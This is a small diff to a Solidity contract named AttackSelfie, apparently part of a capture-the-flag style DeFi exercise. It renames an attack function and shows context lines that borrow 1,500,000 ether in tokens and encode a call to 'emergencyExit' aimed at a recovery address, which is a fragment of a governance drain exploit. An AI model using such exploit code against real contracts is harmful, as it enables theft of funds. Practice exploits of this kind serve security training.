@@ -39,7 +39,7 @@ contract AttackSelfie {
         return CALL_BACK_SUCCESS;
     }
 
-    function attack(address recovery) external {
+    function attackSetup(address recovery) external {
         uint amountRequired = 1500000 ether;
         bytes memory data = abi.encodeWithSignature("emergencyExit(address)", recovery);
         
